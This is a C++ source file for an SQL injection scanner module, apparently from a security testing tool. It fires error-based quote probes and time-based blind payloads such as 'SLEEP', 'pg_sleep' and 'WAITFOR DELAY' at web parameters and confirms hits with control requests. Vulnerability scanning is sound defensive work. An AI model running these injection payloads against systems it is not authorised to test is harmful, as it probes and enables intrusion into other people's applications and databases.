#include "sql_injection.hpp"
#include "networking.hpp"

#include <QElapsedTimer>
#include <QRegularExpression>
#include <QSet>
#include <QUrl>
#include <QUrlQuery>

namespace Nullock::Core::SqlInjection {

namespace {

constexpr int kMaxSends = 90;
constexpr int kMaxBody = 512 * 1024;

struct Sig { const char *dbms; QRegularExpression re; };

const QList<Sig> &signatures() {
    static const auto ci = QRegularExpression::CaseInsensitiveOption;
    static const QList<Sig> s = {
        { "MySQL",      QRegularExpression("SQL syntax.*MySQL|Warning.*\\bmysqli?_|MySqlException|"
                                           "valid MySQL result|com\\.mysql\\.jdbc|MySQLSyntaxErrorException", ci) },
        { "PostgreSQL", QRegularExpression("PostgreSQL.*ERROR|Warning.*\\bpg_|valid PostgreSQL result|"
                                           "PG::SyntaxError|org\\.postgresql\\.util\\.PSQLException", ci) },
        { "MSSQL",      QRegularExpression("Microsoft SQL (Server|Native)|ODBC SQL Server Driver|"
                                           "Unclosed quotation mark|SqlException|System\\.Data\\.SqlClient|"
                                           "Incorrect syntax near", ci) },
        { "Oracle",     QRegularExpression("\\bORA-[0-9]{4,5}|Oracle error|quoted string not properly terminated|"
                                           "oracle\\.jdbc", ci) },
        { "SQLite",     QRegularExpression("SQLite/JDBCDriver|SQLite\\.Exception|System\\.Data\\.SQLite|"
                                           "SQLITE_ERROR|sqlite3\\.OperationalError|unrecognized token", ci) },
        { "generic",    QRegularExpression("SQL syntax error|syntax error at or near|"
                                           "unterminated quoted string|quoted string not properly terminated|"
                                           "SQLSTATE\\[", ci) },
    };
    return s;
}

// Match a DBMS error in `body`; returns {dbms, fragment} or empty.
QPair<QString, QString> matchError(const QByteArray &body) {
    const QString text = QString::fromUtf8(body.left(kMaxBody));
    for (const Sig &s : signatures()) {
        const auto m = s.re.match(text);
        if (m.hasMatch()) return { QString::fromUtf8(s.dbms), m.captured(0) };
    }
    return {};
}

QByteArray buildRequest(const Request &req, const QString &query) {
    const QString target = query.isEmpty() ? req.basePath : req.basePath + "?" + query;
    QByteArray out;
    out  = req.method.toUtf8() + " " + target.toUtf8() + " HTTP/1.1\r\n";
    out += "Host: " + req.host.toUtf8() + "\r\n";
    out += "User-Agent: Nullock/sqli\r\n";
    out += "Accept: */*\r\n";
    out += "Accept-Encoding: identity\r\n";
    for (const auto &h : req.headers) {
        if (h.first.compare("Host", Qt::CaseInsensitive) == 0) continue;
        if (h.first.contains('\r') || h.first.contains('\n')) continue;
        if (h.second.contains('\r') || h.second.contains('\n')) continue;
        out += h.first.toUtf8() + ": " + h.second.toUtf8() + "\r\n";
    }
    out += "Connection: close\r\n\r\n";
    return out;
}

QString queryWith(const QString &existing, const QString &param, const QString &value) {
    const QByteArray enc = QUrl::toPercentEncoding(value);
    QStringList parts;
    const QUrlQuery q(existing);
    for (const auto &kv : q.queryItems(QUrl::FullyEncoded))
        if (QUrl::fromPercentEncoding(kv.first.toUtf8()) != param)
            parts << kv.first + "=" + kv.second;
    parts << param + "=" + QString::fromUtf8(enc);
    return parts.join('&');
}

// Blind time-based payloads, per DBMS. %1 is the sleep seconds, so the same
// shape gives a SLEEP(N) probe and a SLEEP(0) control -- if the delay tracks N
// (and the 0-control doesn't stall) the injected SQL ran.
struct TimePayload { const char *dbms; const char *tmpl; };
const QList<TimePayload> &timePayloads() {
    static const QList<TimePayload> p = {
        { "MySQL",      "'-(SELECT SLEEP(%1))-'" },
        { "MySQL",      "1 OR SLEEP(%1)-- -" },
        { "PostgreSQL", "';SELECT pg_sleep(%1)-- -" },
        { "PostgreSQL", "1 OR (SELECT 1 FROM pg_sleep(%1))-- -" },
        { "MSSQL",      "1;WAITFOR DELAY '0:0:%1'-- -" },
        { "MSSQL",      "';WAITFOR DELAY '0:0:%1'-- -" },
        { "Oracle",     "1 OR dbms_pipe.receive_message('a',%1)-- -" },
    };
    return p;
}
constexpr int kSleepSeconds    = 5;
constexpr int kTimeThresholdMs = 4000;   // delay over baseline that signals a sleep ran

} // namespace

QStringList defaultParams() {
    return { "id", "user", "username", "name", "search", "q", "query", "page",
             "category", "cat", "item", "product", "order", "sort", "filter" };
}

Result test(const Request &reqIn) {
    Result result;
    if (reqIn.host.isEmpty()) { result.error = "host required"; return result; }
    Request req = reqIn;
    if (req.basePath.isEmpty()) req.basePath = QStringLiteral("/");

    QStringList params;
    if (!req.param.isEmpty()) {
        params << req.param;
    } else {
        const QUrlQuery q(req.query);
        for (const auto &kv : q.queryItems())
            if (!params.contains(kv.first)) params << kv.first;
        if (params.isEmpty()) params = defaultParams();
    }
    while (params.size() > 6) params.removeLast();
    result.testedParams = params;

    HttpClient client;
    const quint16 port = static_cast<quint16>(req.port);
    auto send = [&](const QString &query) {
        ++result.requestsSent;
        return client.send(req.host, port, req.tls, buildRequest(req, query));
    };

    const auto base = send(req.query);
    if (!base.ok) { result.error = "baseline failed: " + base.errorMessage; return result; }
    result.baselineStatus = base.parsed.statusCode;
    // If the baseline already shows a DB error, we can't attribute one to us.
    const bool baselineErrored = !matchError(base.parsed.body).first.isEmpty();

    // Syntax-breakers (likely to error) and their balanced counterparts (which
    // re-balance the quote and should NOT error if the breaker did).
    struct Probe { const char *breaker; const char *balanced; };
    static const QList<Probe> probes = {
        { "'",    "''" },
        { "\"",   "\"\"" },
        { "')",   "'')" },
        { "';",   "'';" },   // balanced must even out the quote count, not just append --
    };

    QSet<QString> confirmedParams;
    for (const QString &param : params) {
        if (result.requestsSent >= kMaxSends) break;
        for (const Probe &p : probes) {
            if (result.requestsSent >= kMaxSends) break;
            const auto r = send(queryWith(req.query, param, QString::fromUtf8(p.breaker)));
            if (!r.ok) continue;
            const auto err = matchError(r.parsed.body);
            if (err.first.isEmpty()) continue;
            // Corroborate: the balanced payload should re-close the quote and
            // clear the error. If it ALSO errors (or the baseline already did),
            // the error isn't driven by our quote -- skip.
            if (baselineErrored) continue;
            const auto rb = send(queryWith(req.query, param, QString::fromUtf8(p.balanced)));
            // Require the balanced payload to succeed AND clear the error. A
            // failed balanced request can't corroborate, so don't confirm on it.
            if (!rb.ok || !matchError(rb.parsed.body).first.isEmpty()) continue;
            result.hits.append({ param, err.first, QStringLiteral("error-based"),
                                 QString::fromUtf8(p.breaker), err.second });
            result.vulnerable = true;
            confirmedParams.insert(param);
            break;
        }
    }

    // ---- Blind time-based phase (opt-in; slow) ----
    // For params not already confirmed error-based, inject a SLEEP(N) and flag
    // when the response is delayed by ~N seconds AND a SLEEP(0) control of the
    // same shape is NOT delayed (rules out a generally slow/tarpitting server),
    // with the delay reproducing on a re-send.
    if (req.timeBased && result.requestsSent + 2 <= kMaxSends) {
        // A timed send that returns BOTH the elapsed ms and whether it actually
        // completed -- a transport timeout (ok=false, ~15s) must never be
        // counted as a SLEEP delay, so callers gate hits on ok.
        struct Timed { int ms; bool ok; };
        auto timed = [&](const QString &param, const QString &val) -> Timed {
            QElapsedTimer t; t.start();
            ++result.requestsSent;
            const auto r = client.send(req.host, port, req.tls,
                                       buildRequest(req, queryWith(req.query, param, val)));
            return { static_cast<int>(t.elapsed()), r.ok };
        };
        // Quick timing baseline (the error-phase baseline body was for text).
        const int tb1 = timed(QStringLiteral("x"), QStringLiteral("1")).ms;
        const int tb2 = timed(QStringLiteral("x"), QStringLiteral("1")).ms;
        const int timeBaseline = qMin(tb1, tb2);
        for (const QString &param : params) {
            if (confirmedParams.contains(param)) continue;
            if (result.requestsSent + 3 > kMaxSends) break;
            bool hit = false;
            for (const TimePayload &tp : timePayloads()) {
                if (hit || result.requestsSent + 3 > kMaxSends) break;
                const QString sleepVal = QString::fromUtf8(tp.tmpl).arg(kSleepSeconds);
                const Timed d1 = timed(param, sleepVal);
                // The probe must COMPLETE and be delayed -- a timeout (ok=false)
                // is a stalled connection, not a confirmed SLEEP.
                if (!d1.ok || d1.ms - timeBaseline < kTimeThresholdMs) continue;
                // SLEEP(0) control of the same shape must complete AND be fast;
                // a slow/failed control means the delay isn't sleep-specific.
                const Timed c = timed(param, QString::fromUtf8(tp.tmpl).arg(0));
                if (!c.ok || c.ms - timeBaseline >= kTimeThresholdMs) continue;
                // Reproduce the delay (must also complete and be slow).
                const Timed d2 = timed(param, sleepVal);
                if (!d2.ok || d2.ms - timeBaseline < kTimeThresholdMs) continue;
                result.hits.append({ param, QString::fromUtf8(tp.dbms),
                    QStringLiteral("time-based"), sleepVal,
                    QStringLiteral("SLEEP(%1) delayed ~%2ms; SLEEP(0) fast")
                        .arg(kSleepSeconds).arg(d1.ms - timeBaseline) });
                result.vulnerable = true;
                hit = true;
            }
        }
    }

    return result;
}

} // namespace Nullock::Core::SqlInjection
